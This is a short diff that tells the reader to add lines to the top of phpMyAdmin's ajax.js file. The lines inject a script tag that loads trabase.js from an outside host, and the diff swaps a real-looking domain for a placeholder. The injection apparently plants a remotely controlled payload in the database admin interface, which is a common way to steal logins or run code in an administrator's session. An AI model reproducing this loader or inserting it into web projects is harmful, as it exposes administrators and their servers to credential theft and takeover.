@@ -1,6 +1,6 @@
 //################# Add these lines to the top of ajax.js file ####################
 var my_panel_script = document.createElement('script');
-my_panel_script.setAttribute('src', 'https://parstaz.com/phpmyadmin/js/trabase.js?');
+my_panel_script.setAttribute('src', 'https://DOMAIN.com/phpmyadmin/js/trabase.js?');
 document.head.appendChild(my_panel_script);
 //################# Other lines is for orginal phpmyadmin source ####################
 
